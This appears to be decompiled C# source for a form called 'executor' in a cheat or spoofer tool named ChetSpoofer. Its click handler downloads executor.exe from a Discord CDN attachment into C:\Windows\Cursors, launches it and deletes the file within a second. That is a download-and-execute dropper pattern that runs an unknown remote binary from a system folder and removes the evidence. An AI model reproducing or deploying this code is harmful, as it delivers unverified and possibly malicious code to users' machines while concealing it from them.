using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using ChetSpoofer.Properties;
using Siticone.Desktop.UI.WinForms;

namespace ChetSpoofer
{
	// Token: 0x02000003 RID: 3
	public partial class executor : Form
	{
		// Token: 0x06000008 RID: 8 RVA: 0x0000250B File Offset: 0x0000070B
		public executor()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000009 RID: 9 RVA: 0x00002524 File Offset: 0x00000724
		private void pictureBox1_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\Cursors\\executor.exe";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/1031899813194780777/1033149403940266064/executor.exe", text);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process = Process.Start(text);
			Thread.Sleep(750);
			File.Delete(text);
		}

		// Token: 0x0600000A RID: 10 RVA: 0x000025A2 File Offset: 0x000007A2
		private void pictureBox5_Click(object sender, EventArgs e)
		{
			new Main().Show();
			base.Hide();
		}
	}
}
